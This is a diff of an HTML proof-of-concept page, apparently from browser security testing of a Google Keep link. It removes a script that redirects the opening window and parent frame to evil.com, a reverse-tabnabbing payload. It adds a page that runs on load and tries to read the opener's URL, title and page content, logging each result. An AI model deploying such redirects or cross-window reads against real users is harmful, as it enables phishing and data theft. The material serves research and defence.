@@ -1,4 +1,121 @@
-<script>
-if (window.opener) window.opener.parent.location.replace('https://evil.com/');
-if (window.parent != window) window.parent.location.replace('https://evil.com/');
-</script>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Opener Data Extraction PoC</title>
+    <style>
+        body {
+            font-family: 'Courier New', Courier, monospace;
+            background-color: #1e1e1e;
+            color: #00ff00;
+            padding: 20px;
+        }
+        .container {
+            border: 1px solid #00ff00;
+            padding: 15px;
+            border-radius: 5px;
+            background-color: #000;
+        }
+        h2 {
+            border-bottom: 1px dashed #00ff00;
+            padding-bottom: 10px;
+        }
+        .log-entry {
+            margin-bottom: 10px;
+            padding: 8px;
+            background-color: #2d2d2d;
+            border-left: 3px solid #00ff00;
+            word-wrap: break-word;
+        }
+        .error {
+            border-left-color: #ff3333;
+            color: #ff9999;
+        }
+        .success {
+            border-left-color: #33cc33;
+        }
+        button {
+            background-color: #00ff00;
+            color: #000;
+            border: none;
+            padding: 10px 15px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 15px;
+        }
+        button:hover {
+            background-color: #00cc00;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>[+] Target: window.opener Analysis</h2>
+        <div id="output"></div>
+        <button onclick="analyzeOpener()">Jalankan Analisis Ulang</button>
+    </div>
+
+    <script>
+        function logMessage(message, isError = false) {
+            const outputDiv = document.getElementById('output');
+            const entryDiv = document.createElement('div');
+            entryDiv.className = 'log-entry ' + (isError ? 'error' : 'success');
+            entryDiv.textContent = message;
+            outputDiv.appendChild(entryDiv);
+        }
+
+        function analyzeOpener() {
+            document.getElementById('output').innerHTML = ''; // Bersihkan log sebelumnya
+            logMessage("[*] Memulai ekstraksi informasi dari opener...");
+
+            // 1. Cek eksistensi opener
+            if (!window.opener) {
+                logMessage("[-] window.opener bernilai null. Kemungkinan terhalang oleh atribut rel='noopener' pada tautan, atau kebijakan Cross-Origin-Opener-Policy (COOP) di Google Keep.", true);
+                return;
+            } else {
+                logMessage("[+] window.opener terdeteksi. Objek tersedia.");
+            }
+
+            // 2. Coba baca Origin / URL parent
+            try {
+                const openerUrl = window.opener.location.href;
+                logMessage("[+] Berhasil membaca URL Opener: " + openerUrl);
+            } catch (e) {
+                logMessage("[-] Gagal membaca URL Opener (SOP Violation): " + e.message, true);
+            }
+
+            // 3. Coba baca Title halaman parent
+            try {
+                const openerTitle = window.opener.document.title;
+                logMessage("[+] Berhasil membaca Title Opener: " + openerTitle);
+            } catch (e) {
+                logMessage("[-] Gagal membaca Document Title (SOP Violation): " + e.message, true);
+            }
+
+            // 4. Coba baca DOM / konten halaman
+            try {
+                // Mencoba membaca sedikit cuplikan isi body
+                const openerBody = window.opener.document.body.innerHTML.substring(0, 100);
+                logMessage("[+] Berhasil membaca DOM Opener (100 char pertama): " + openerBody + "...");
+            } catch (e) {
+                logMessage("[-] Gagal membaca DOM/Konten (SOP Violation): " + e.message, true);
+            }
+            
+            // 5. Cek referensi frame (jika dijalankan dalam iframe)
+            if (window.parent !== window) {
+                try {
+                     const parentUrl = window.parent.location.href;
+                     logMessage("[+] Skrip berjalan dalam iframe. Parent URL: " + parentUrl);
+                } catch(e) {
+                     logMessage("[-] Skrip dalam iframe, tapi gagal membaca Parent (SOP Violation): " + e.message, true);
+                }
+            }
+        }
+
+        // Eksekusi otomatis saat halaman dimuat
+        window.onload = analyzeOpener;
+    </script>
+</body>
+</html>
